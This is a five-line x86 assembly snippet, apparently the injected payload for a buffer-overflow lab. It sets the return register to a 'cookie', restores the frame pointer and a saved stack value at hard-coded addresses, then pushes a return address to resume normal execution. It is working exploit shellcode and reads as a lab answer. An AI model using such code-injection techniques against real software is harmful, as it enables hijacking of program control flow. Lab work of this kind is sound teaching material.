	movl $0x35c5d934, %eax #cookie is return value of getbuf
	movl $0x55673440, %ebp #restore ebp
	movl $0x08048dd7, 0x55683444 #restore ebp+4
	push $0x08048d28	#push return address
	ret
